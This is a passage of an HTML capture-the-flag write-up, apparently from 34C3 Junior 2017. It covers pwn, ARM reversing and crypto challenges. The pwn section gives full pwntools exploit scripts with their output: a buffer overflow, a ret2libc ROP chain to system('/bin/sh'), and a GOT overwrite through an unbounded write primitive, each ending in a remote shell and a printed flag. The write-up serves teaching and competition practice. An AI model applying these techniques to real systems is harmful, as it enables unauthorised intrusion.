+<span style="color: #62686E;"># </span><span style="color: #62686E;">port = "12345"</span>
+
+<span style="color: #DFDFDF;">host</span> = <span style="color: #7bc275;">"35.198.185.193"</span>
+<span style="color: #DFDFDF;">port</span> = <span style="color: #7bc275;">"1338"</span>
+
+
+<span style="color: #DFDFDF;">offset</span> = 136
+<span style="color: #DFDFDF;">shell_offset</span> = 0x9d3
+
+<span style="color: #DFDFDF;">io</span> = remote(host, port)
+io.recvuntil(<span style="color: #7bc275;">'&gt; '</span>)
+io.send(<span style="color: #7bc275;">"modinfo\n"</span>)
+
+<span style="color: #DFDFDF;">addr</span> = <span style="color: #C57BDB;">int</span>(io.recvuntil(<span style="color: #7bc275;">'&gt; '</span>).split(<span style="color: #7bc275;">'\n'</span>)[3].split(<span style="color: #7bc275;">':'</span>)[1], 16) + shell_offset
+
+
+io.send(<span style="color: #7bc275;">"wrap\n"</span>)
+io.recvuntil(<span style="color: #7bc275;">'|&gt; '</span>)
+io.send(<span style="color: #7bc275;">'-1\n'</span>)
+
+io.recvuntil(<span style="color: #7bc275;">'|&gt; '</span>)
+io.send(<span style="color: #7bc275;">"A"</span> * offset + p64(addr) + <span style="color: #7bc275;">"\n"</span>)
+
+io.interactive()
+io.close()
+</pre>
+</div>
+
+<div class="org-src-container">
+
+<pre class="src src-nasm">-&gt; % python exploit.py
+[+] Opening connection <span style="color: #FCCE7B;">to</span> <span style="color: #a991f1;">35.198.185.193</span> on port <span style="color: #a991f1;">1338</span>: Done
+[*] Switching <span style="color: #FCCE7B;">to</span> interactive mode
+         _   _
+        ((\o/))
+ .-------//^\\------.
+ |      /<span style="color: #7bc275;">`   `</span>\     |
+ |                  |
+ |                  |
+  ------------------
+
+Wow! This looks so beautiful
+$ cat flag.txt
+<span style="color: #a991f1;">34C3</span>_be4ut1fUl_sh3ll_g1fts_3v3ryWh3r3
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-sec-1-3" class="outline-3">
+<h3 id="sec-1-3"><span class="section-number-3">1.3</span> Gift Wrapping Factory 2.0 - mid/hard</h3>
+<div class="outline-text-3" id="text-1-3">
+<blockquote>
+<p>
+Wrapping gifts is now even more fun! Gift Wrapping Factory 2.0:
+</p>
+
+<p>
+nc 35.198.185.193 1341
+</p>
+</blockquote>
+
+<p>
+Files : <a href="files/wrap2/">wrap2</a>
+</p>
+
+<p>
+This is challenge is like the previous one the change is that there is no <code>spawn_shell</code> function we have to do a return-to-libc attack
+</p>
+
+<p>
+For that we are given libc that the server uses , and we know the base address of the giftwrapper shared library when it is mapped into the 
+memory using the modinfo function from these knowledge we can find the actual address of the system function in the memory and jump to that 
+address
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-nasm">gdb-peda$ vmmap
+...
+<span style="color: #a991f1;">0x00007f1c93d78000</span> <span style="color: #a991f1;">0x00007f1c93d79000</span> r-xp      /media/DataZ/bi0s/ctf/<span style="color: #a991f1;">34c3</span> Junior/files/wrap2/giftwrapper2.so
+<span style="color: #a991f1;">0x00007f1c93d79000</span> <span style="color: #a991f1;">0x00007f1c93f78000</span> ---p      /media/DataZ/bi0s/ctf/<span style="color: #a991f1;">34c3</span> Junior/files/wrap2/giftwrapper2.so
+<span style="color: #a991f1;">0x00007f1c93f78000</span> <span style="color: #a991f1;">0x00007f1c93f79000</span> r--p      /media/DataZ/bi0s/ctf/<span style="color: #a991f1;">34c3</span> Junior/files/wrap2/giftwrapper2.so
+<span style="color: #a991f1;">0x00007f1c93f79000</span> <span style="color: #a991f1;">0x00007f1c93f7a000</span> rw-p      /media/DataZ/bi0s/ctf/<span style="color: #a991f1;">34c3</span> Junior/files/wrap2/giftwrapper2.so
+<span style="color: #a991f1;">0x00007f1c93f7a000</span> <span style="color: #a991f1;">0x00007f1c9410f000</span> r-xp      /lib/x86_<span style="color: #a991f1;">64</span>-linux-gnu/libc-2.24.so
+<span style="color: #a991f1;">0x00007f1c9410f000</span> <span style="color: #a991f1;">0x00007f1c9430f000</span> ---p      /lib/x86_<span style="color: #a991f1;">64</span>-linux-gnu/libc-2.24.so
+<span style="color: #a991f1;">0x00007f1c9430f000</span> <span style="color: #a991f1;">0x00007f1c94313000</span> r--p      /lib/x86_<span style="color: #a991f1;">64</span>-linux-gnu/libc-2.24.so
+<span style="color: #a991f1;">0x00007f1c94313000</span> <span style="color: #a991f1;">0x00007f1c94315000</span> rw-p      /lib/x86_<span style="color: #a991f1;">64</span>-linux-gnu/libc-2.24.so
+...
+</pre>
+</div>
+<p>
+The libc is mapped after <code>giftwrapper</code> and it task 0x202000 of memory address so the base address of libc is base<sub>adds</sub> of giftwrapper + 0x202000 
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-nasm">-&gt; % r2 libc-2.26.so
+[<span style="color: #a991f1;">0x000212e0</span>]&gt; is~system
+vaddr=<span style="color: #a991f1;">0x0014c330</span> paddr=<span style="color: #a991f1;">0x0014c330</span> ord=<span style="color: #a991f1;">229</span> fwd=NONE sz=<span style="color: #a991f1;">107</span> bind=<span style="color: #51afef;">GLOBAL</span> type=FUNC name=svcerr_systemerr
+vaddr=<span style="color: #a991f1;">0x00047dc0</span> paddr=<span style="color: #a991f1;">0x00047dc0</span> ord=<span style="color: #a991f1;">595</span> fwd=NONE sz=<span style="color: #a991f1;">45</span> bind=<span style="color: #51afef;">GLOBAL</span> type=FUNC name=__libc_system
+vaddr=<span style="color: #a991f1;">0x00047dc0</span> paddr=<span style="color: #a991f1;">0x00047dc0</span> ord=<span style="color: #a991f1;">1378</span> fwd=NONE sz=<span style="color: #a991f1;">45</span> bind=WEAK type=FUNC name=system
+[<span style="color: #a991f1;">0x000212e0</span>]&gt; /+ /bin/sh
+Using chunksize: <span style="color: #a991f1;">7</span>
+/x <span style="color: #a991f1;">2f62696e2f7368</span>
+Searching <span style="color: #a991f1;">7</span> bytes <span style="color: #C57BDB;">in</span> [<span style="color: #a991f1;">0x0-0x1d5da4</span>]
+<span style="color: #5cEfFF;">hits</span>: <span style="color: #a991f1;">1</span>
+Searching <span style="color: #a991f1;">7</span> bytes <span style="color: #C57BDB;">in</span> [<span style="color: #a991f1;">0x3d6758-0x3dfa60</span>]
+<span style="color: #5cEfFF;">hits</span>: <span style="color: #a991f1;">0</span>
+<span style="color: #a991f1;">0x001a3ee0</span> hit0_<span style="color: #a991f1;">0</span> <span style="color: #a991f1;">2f62696e2f7368</span>
+[<span style="color: #a991f1;">0x000212e0</span>]&gt;
+</pre>
+</div>
+
+<p>
+So the offset of system is <code>0x00047dc0</code> and the string "/bin/sh" is at offset  <code>0x001a3ee0</code> . 
+</p>
+
+<p>
+Now we need to find a gadget to pop the string to rdi 
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-nasm">-&gt; % r2 server
+[<span style="color: #a991f1;">0x00400dc0</span>]&gt; /Rl <span style="color: #C57BDB;">pop</span> <span style="color: #DFDFDF;">rdi</span>
+<span style="color: #a991f1;">0x00401550</span>: <span style="color: #C57BDB;">pop</span> <span style="color: #DFDFDF;">rdi</span><span style="color: #62686E;">; ret;</span>
+<span style="color: #a991f1;">0x004015c3</span>: <span style="color: #C57BDB;">pop</span> <span style="color: #DFDFDF;">rdi</span><span style="color: #62686E;">; ret;</span>
+[<span style="color: #a991f1;">0x00400dc0</span>]&gt;
+</pre>
+</div>
+
+<p>
+The final exploit 
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-python"><span style="color: #51afef;">from</span> pwn <span style="color: #51afef;">import</span> *
+
+
+<span style="color: #62686E;"># </span><span style="color: #62686E;">host = "localhost"</span>
+<span style="color: #62686E;"># </span><span style="color: #62686E;">port = "12345"</span>
+
+<span style="color: #DFDFDF;">host</span> = <span style="color: #7bc275;">"35.198.185.193"</span>
+<span style="color: #DFDFDF;">port</span> = <span style="color: #7bc275;">"1341"</span>
+
+
+<span style="color: #DFDFDF;">offset</span> = 136
+<span style="color: #DFDFDF;">shell_offset</span> = 0x202000 + 0x001a3ee0
+<span style="color: #DFDFDF;">system_offset</span> = 0x202000 + 0x00047dc0
+
+
+<span style="color: #DFDFDF;">io</span> = remote(host, port)
+io.recvuntil(<span style="color: #7bc275;">'&gt; '</span>)
+io.send(<span style="color: #7bc275;">"modinfo\n"</span>)
+
+<span style="color: #DFDFDF;">addr</span> = <span style="color: #C57BDB;">int</span>(io.recvuntil(<span style="color: #7bc275;">'&gt; '</span>).split(<span style="color: #7bc275;">'\n'</span>)[3].split(<span style="color: #7bc275;">':'</span>)[1], 16)
+
+
+io.send(<span style="color: #7bc275;">"wrap\n"</span>)
+io.recvuntil(<span style="color: #7bc275;">'|&gt; '</span>)
+io.send(<span style="color: #7bc275;">'-1\n'</span>)
+
+io.recvuntil(<span style="color: #7bc275;">'|&gt; '</span>)
+
+
+<span style="color: #DFDFDF;">rop</span> = p64(0x0000000000401550)  <span style="color: #62686E;"># </span><span style="color: #62686E;">pop rdi ; ret</span>
+<span style="color: #DFDFDF;">rop</span> += p64(addr + shell_offset)
+<span style="color: #DFDFDF;">rop</span> += p64(addr + system_offset)
+
+io.send(<span style="color: #7bc275;">"A"</span> * offset + rop + <span style="color: #7bc275;">"\n"</span>)
+
+io.interactive()
+io.close()
+</pre>
+</div>
+
+
+<div class="org-src-container">
+
+<pre class="src src-nasm">-&gt; % python exploit.py
+[+] Opening connection <span style="color: #FCCE7B;">to</span> <span style="color: #a991f1;">35.198.185.193</span> on port <span style="color: #a991f1;">1341</span>: Done
+[*] Switching <span style="color: #FCCE7B;">to</span> interactive mode
+         _   _
+        ((\o/))
+ .-------//^\\------.
+ |      /<span style="color: #7bc275;">`   `</span>\     |
+ |                  |
+ |                  |
+  ------------------
+
+Wow! This looks so beautiful
+$ cat flag.txt
+<span style="color: #a991f1;">34C3</span>_r0p_wr4pP3d_g1fts_ar3_tH3_b3st_g1fts
+</pre>
+</div>
+</div>
+</div>
+
+<div id="outline-container-sec-1-4" class="outline-3">
+<h3 id="sec-1-4"><span class="section-number-3">1.4</span> Mate Bottling Plant Control Center - easy/mid</h3>
+<div class="outline-text-3" id="text-1-4">
+<blockquote>
+<p>
+To guarantee a constant supply of Mate we built our own Mate Bottling Plant:
+</p>
+
+<p>
+nc 35.198.185.193 1339
+</p>
+</blockquote>
+
+<p>
+File : <a href="files/mate/">mete</a>
+</p>
+
+<p>
+Running the server 
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sh">        
+ Mate Bottling Plant Control Center
+.-----------------------------------------------------------------------.
+| Security advice:                                                      |
+| This industrial application may only be used by qualified employees.  |
+| Non-intended usage may lead to serious damage to the machinery.       |
+ -----------------------------------------------------------------------
+
+ Type <span style="color: #7bc275;">"help"</span> for an overview of the provided functionality.
+&gt; help
+<span style="color: #5cEfFF;">formula</span>                         (Display the used Mate formula)
+new_formula &lt;i1&gt; &lt;i2&gt; ...       (Design a new Mate formula)
+<span style="color: #5cEfFF;">tap_pos</span>                         (Show the current position of the filling tap)
+move_tap &lt;offset&gt;               (Move the filling tap by offset)
+fill &lt;n&gt;                        (Fill n milliliters of Mate at the current filling tap position)
+<span style="color: #5cEfFF;">hose_pos</span>                        (Show the current position of the extraction hose)
+move_hose &lt;offset&gt;              (Move the extraction hose by offset)
+extract &lt;n&gt;                     (Extract n milliliters of mate at the current extraction hose position)
+inspect &lt;p&gt;                     (Inspect the bottle at position p)
+<span style="color: #51afef;">exit</span>                            (Shut down the Mate Bottling Plant)
+<span style="color: #5cEfFF;">help</span>                            (Show this information)
+<span style="color: #5cEfFF;">modinfo</span>                         (Show information about the loaded module)
+&gt; tap_pos
+The filling tap is at position 0x7faa8bbeb0c0.
+&gt; move_tap 10
+&gt; tap_pos
+The filling tap is at position 0x7faa8bbeb0ca.
+&gt; formula
+water mate_tea sugar_syrup citric_acid caffeine carbonic_acid
+&gt; new_formula test
+Updated Mate formula.
+&gt; formula
+test
+&gt; fill 4
+Succesfully filled 4 milliliters of mate at 0x7faa8bbeb0ca.
+
+</pre>
+</div>
+
+<p>
+By going through the disassembly of all the function we can see that the most important is fill and formula . 
+the fill command writes the given size of bytes from formula to the memory pointed by the tap , we can move the position of the tap with <code>move_tap</code>
+command to anywhere since there is no boundary check for the given offset
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-nasm"><span style="color: #a991f1;">0x00000fa2</span>      <span style="color: #a991f1;">488b05d71f20.</span>  <span style="color: #C57BDB;">mov</span> <span style="color: #DFDFDF;">rax</span>, <span style="color: #FCCE7B;">qword</span> [reloc.completed.6973_<span style="color: #a991f1;">128</span>] <span style="color: #62686E;">; psition of the tap</span>
+<span style="color: #a991f1;">0x00000fa9</span>      <span style="color: #a991f1;">488b1424</span>       <span style="color: #C57BDB;">mov</span> <span style="color: #DFDFDF;">rdx</span>, <span style="color: #FCCE7B;">qword</span> [<span style="color: #DFDFDF;">rsp</span>]
+<span style="color: #a991f1;">0x00000fad</span>      <span style="color: #a991f1;">480110</span>         <span style="color: #C57BDB;">add</span> <span style="color: #FCCE7B;">qword</span> [<span style="color: #DFDFDF;">rax</span>], <span style="color: #DFDFDF;">rdx</span>    
+</pre>
+</div>
+
+<p>
+Using this we can write to anywhere in the memory , we can write the address of <code>spawn_shell</code> which is included in the library to a GOT<sub>address</sub>
+of printf and when printf is called after that we will be executing the spawn<sub>sell</sub> function instead .
+</p>
+
+
+<div class="org-src-container">
+
+<pre class="src src-nasm">-&gt;% objdump -R server
+...
+<span style="color: #a991f1;">0000000000602038</span> R_X86_<span style="color: #a991f1;">64</span>_JUMP_SLOT  dup2@GLIBC_<span style="color: #a991f1;">2.2.5</span>
+<span style="color: #a991f1;">0000000000602040</span> R_X86_<span style="color: #a991f1;">64</span>_JUMP_SLOT  printf@GLIBC_<span style="color: #a991f1;">2.2.5</span>
+<span style="color: #a991f1;">0000000000602048</span> R_X86_<span style="color: #a991f1;">64</span>_JUMP_SLOT  alarm@GLIBC_<span style="color: #a991f1;">2.2.5</span>
+<span style="color: #a991f1;">0000000000602050</span> R_X86_<span style="color: #a991f1;">64</span>_JUMP_SLOT  close@GLIBC_<span style="color: #a991f1;">2.2.5</span>
+...
+</pre>
+</div>
+
+<p>
+The GOT address of the printf is <code>0x0602040</code>
+</p>
+<div class="org-src-container">
+
+<pre class="src src-nasm">[<span style="color: #a991f1;">0x00000cc0</span>]&gt; is~shell
+vaddr=<span style="color: #a991f1;">0x00001293</span> paddr=<span style="color: #a991f1;">0x00001293</span> ord=<span style="color: #a991f1;">055</span> fwd=NONE sz=<span style="color: #a991f1;">21</span> bind=<span style="color: #51afef;">GLOBAL</span> type=FUNC name=spawn_shell
+</pre>
+</div>
+
+<p>
+offset to spawn<sub>shell</sub> is <code>0x00001293</code>
+</p>
+
+<p>
+Connecting to server few times we can see that the address to tap is not changing now using that we can calculate the amount the tap should be
+moved to point to the printf and we can create a formula with the address of the <code>spawn_sell</code> function and then call fill command to write to
+that address.
+</p>
+
+<p>
+Final exploit 
+</p>
+<div class="org-src-container">
+
+<pre class="src src-python"><span style="color: #51afef;">from</span> pwn <span style="color: #51afef;">import</span> *
+
+
+<span style="color: #62686E;"># </span><span style="color: #62686E;">host = "localhost"</span>
+<span style="color: #62686E;"># </span><span style="color: #62686E;">port = "12345"</span>
+
+<span style="color: #DFDFDF;">host</span> = <span style="color: #7bc275;">"35.198.185.193"</span>
+<span style="color: #DFDFDF;">port</span> = <span style="color: #7bc275;">"1339"</span>
+
+
+<span style="color: #DFDFDF;">shell_offset</span> = 0x00001293
+
+<span style="color: #DFDFDF;">io</span> = remote(host, port)
+io.recvuntil(<span style="color: #7bc275;">'&gt; '</span>)
+io.send(<span style="color: #7bc275;">"modinfo\n"</span>)
+
+
+<span style="color: #DFDFDF;">addr</span> = <span style="color: #C57BDB;">int</span>(io.recvuntil(<span style="color: #7bc275;">'&gt; '</span>).split(<span style="color: #7bc275;">'\n'</span>)[3].split(<span style="color: #7bc275;">':'</span>)[1], 16)
+log.info(<span style="color: #7bc275;">"addr : "</span> + <span style="color: #C57BDB;">hex</span>((addr)))
+
+
+io.send(<span style="color: #7bc275;">"new_formula  "</span> + p64(addr + shell_offset) + <span style="color: #7bc275;">"\n"</span>)
+io.recvuntil(<span style="color: #7bc275;">'&gt; '</span>)
+io.send(<span style="color: #7bc275;">"move_tap -140203308077184 \n "</span>)
+io.recvuntil(<span style="color: #7bc275;">'&gt; '</span>)
+io.send(<span style="color: #7bc275;">"fill 6 \n"</span>)
+io.interactive()
+io.close()
+</pre>
+</div>
+
+<div class="org-src-container">
+
+<pre class="src src-sh">-&gt; % python exploit
+[+] Opening connection to 35.198.185.193 on port 1339: Done
+[*] addr : 0x7f83a09fc000
+[*] Switching to interactive mode
+Succesfully filled 6 milliliters of mate at 0x602040.
+$ cat flag.txt
+34C3_t0ns_0f_M4t3_w3r3_f1lL3d_t0d4y
+</pre>
+</div>
+</div>
+</div>
+</div>
+
+
+
+<div id="outline-container-sec-2" class="outline-2">
+<h2 id="sec-2"><span class="section-number-2">2</span> Reversing</h2>
+<div class="outline-text-2" id="text-2">
+</div><div id="outline-container-sec-2-1" class="outline-3">
+<h3 id="sec-2-1"><span class="section-number-3">2.1</span> ARM1 - easy</h3>
+<div class="outline-text-3" id="text-2-1">
+<blockquote>
+<p>
+Can you reverse engineer this code and get the flag?
+</p>
+
+<p>
+This code is ARM Thumb 2 code which runs on an STM32F103CBT6. You should not need such a controller to solve this challenge.
+</p>
+
+<p>
+There are 5 stages in total which share all the same code base, so you are able to compare code from the first stage with all the other stages to see what code is actually relevant.
+</p>
+
+<p>
+If you should need a datasheet, you can get it <a href="http://www.st.com/content/ccc/resource/technical/document/reference_manual/59/b9/ba/7f/11/af/43/d5/CD00171190.pdf/files/CD00171190.pdf/jcr:content/translations/en.CD00171190.pdf">here</a>.
+</p>
+
+<p>
+In case you need to refresh your ARM assembly, check out <a href="https://azeria-labs.com/writing-arm-assembly-part-1/">Azeria's cool articles</a>.
+</p>
+
+<p>
+Challenge binary
+</p>
+</blockquote>
+
+<p>
+File : <a href="files/arm_stage1/arm_stage1.bin">arm<sub>stage1</sub></a>
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sh">-&gt; % strings arm_stage1.bin| grep 34C3
+The flag is: 34C3_I_4dm1t_it_1_f0und_th!s_with_str1ngs
+</pre>
+</div>
+</div>
+</div>
+</div>
+
+
+<div id="outline-container-sec-3" class="outline-2">
+<h2 id="sec-3"><span class="section-number-2">3</span> Crypto</h2>
+<div class="outline-text-2" id="text-3">
+</div><div id="outline-container-sec-3-1" class="outline-3">
+<h3 id="sec-3-1"><span class="section-number-3">3.1</span> top - easy</h3>
+<div class="outline-text-3" id="text-3-1">
+<blockquote>
+<p>
+Perfectly secure. That's for sure! Or can break <a href="./files/top/top.py_685c1ff1457f81dbfa9e8e82ca7bd0a8">it</a> and reveal my <a href="./files/top/top_secret_86d05414a795935dcdd0f8128f53baa7">secret</a>?
+</p>
+</blockquote>
+
+<p>
+We are given a encryption script and the a file which is encrypted with it 
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-python"><span style="color: #51afef;">import</span> random
+<span style="color: #51afef;">import</span> sys
+<span style="color: #51afef;">import</span> time
+
+<span style="color: #DFDFDF;">cur_time</span> = <span style="color: #C57BDB;">str</span>(time.time()).encode(<span style="color: #7bc275;">'ASCII'</span>)
+random.seed(cur_time)
+
+<span style="color: #DFDFDF;">msg</span> = <span style="color: #C57BDB;">input</span>(<span style="color: #7bc275;">'Your message: '</span>).encode(<span style="color: #7bc275;">'ASCII'</span>)
+<span style="color: #DFDFDF;">key</span> = [random.randrange(256) <span style="color: #51afef;">for</span> _ <span style="color: #51afef;">in</span> msg]
+<span style="color: #DFDFDF;">c</span> = [m ^ k <span style="color: #51afef;">for</span> (m,k ) <span style="color: #51afef;">in</span> <span style="color: #C57BDB;">zip</span>(msg + cur_time, key + [0x88]*<span style="color: #C57BDB;">len</span>(cur_time))]
+
+<span style="color: #51afef;">with</span> <span style="color: #C57BDB;">open</span>(sys.argv[1], <span style="color: #7bc275;">"wb"</span>) <span style="color: #51afef;">as</span> f:
+    f.write(<span style="color: #C57BDB;">bytes</span>(c))
+
+</pre>
+</div>
+
+<p>
+What this script do is that first it creates keys using the python random number generator who's seed is the current time . then the input sting
+appended with the time is xored with key and 0x88 . Here every time the cur<sub>time</sub> is xored with <code>0x88</code> , thus we are able to extract the time from the secret
+After that we just need to generate the key's with this seed and xor with the input gives us the flag . 
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-python"><span style="color: #51afef;">import</span> random
+<span style="color: #51afef;">import</span> sys
+<span style="color: #51afef;">import</span> time
+
+
+<span style="color: #51afef;">with</span> <span style="color: #C57BDB;">open</span>(<span style="color: #7bc275;">"/home/nemesis/Downloads/top_secret_86d05414a795935dcdd0f8128f53baa7"</span>, <span style="color: #7bc275;">"rb"</span>) <span style="color: #51afef;">as</span> f:
+<span style="color: #DFDFDF;">enc</span> = <span style="color: #C57BDB;">list</span>(f.read())
+<span style="color: #DFDFDF;">time</span> = []
+<span style="color: #51afef;">for</span> i <span style="color: #51afef;">in</span> enc[<span style="color: #C57BDB;">len</span>(enc) - 18:<span style="color: #C57BDB;">len</span>(enc)]:
+    time.append(i ^ 0x88)
+<span style="color: #DFDFDF;">msg</span> = enc[:<span style="color: #C57BDB;">len</span>(enc) - 18]
+
+random.seed(<span style="color: #7bc275;">''</span>.join([<span style="color: #C57BDB;">chr</span>(i) <span style="color: #51afef;">for</span> i <span style="color: #51afef;">in</span> time]))
+
+<span style="color: #DFDFDF;">key</span> = [random.randrange(256) <span style="color: #51afef;">for</span> _ <span style="color: #51afef;">in</span> msg]
+<span style="color: #DFDFDF;">c</span> = [<span style="color: #C57BDB;">int</span>(m) ^ <span style="color: #C57BDB;">int</span>(k) <span style="color: #51afef;">for</span> (m, k) <span style="color: #51afef;">in</span> <span style="color: #C57BDB;">zip</span>(msg + time, key + [0x88] * <span style="color: #C57BDB;">len</span>(time))]
+
+<span style="color: #51afef;">print</span>(<span style="color: #7bc275;">''</span>.join([<span style="color: #C57BDB;">chr</span>(i) <span style="color: #51afef;">for</span> i <span style="color: #51afef;">in</span> c]))
+</pre>
+</div>
+
+<div class="org-src-container">
+
+<pre class="src src-sh">-&gt; % python3 decrypt.py
+Here is your flag: 34C3_otp_top_pto_pot_tpo_opt_wh0_car3s&#185;&#189;&#185;&#187;&#191;&#185;&#177;&#185;&#187;&#187;&#166;&#176;&#191;&#186;&#176;&#191;&#189;&#186;
+</pre>
+</div>
+</div>
+</div>
+</div>
+</div><div class="col-md-3"><nav id="table-of-contents">
+<div id="text-table-of-contents" class="bs-docs-sidebar">
+<ul class="nav">
+<li><a href="#sec-1">1. Exploitaion</a>
+<ul class="nav">
+<li><a href="#sec-1-1">1.1. Digital Billboard - easy</a></li>
+<li><a href="#sec-1-2">1.2. Gift Wrapping Factory - easy/mid</a></li>
+<li><a href="#sec-1-3">1.3. Gift Wrapping Factory 2.0 - mid/hard</a></li>
+<li><a href="#sec-1-4">1.4. Mate Bottling Plant Control Center - easy/mid</a></li>
+</ul>
+</li>
+<li><a href="#sec-2">2. Reversing</a>
+<ul class="nav">
+<li><a href="#sec-2-1">2.1. ARM1 - easy</a></li>
+</ul>
+</li>
+<li><a href="#sec-3">3. Crypto</a>
+<ul class="nav">
+<li><a href="#sec-3-1">3.1. top - easy</a></li>
+</ul>
+</li>
+</ul>
+</div>
+</nav>
+</div></div></div>
+<footer id="postamble" class="">
+<div><p class="author">Author: Vishnu Dev TJ</p>
+<p class="date">Created: 2017-12-30 Sat 11:54</p>
+<p class="creator"><a href="http://www.gnu.org/software/emacs/">Emacs</a> 25.3.1 (<a href="http://orgmode.org">Org-mode</a> 9.1.5)</p>
+</div>
+</footer>
+</body>
+</html>
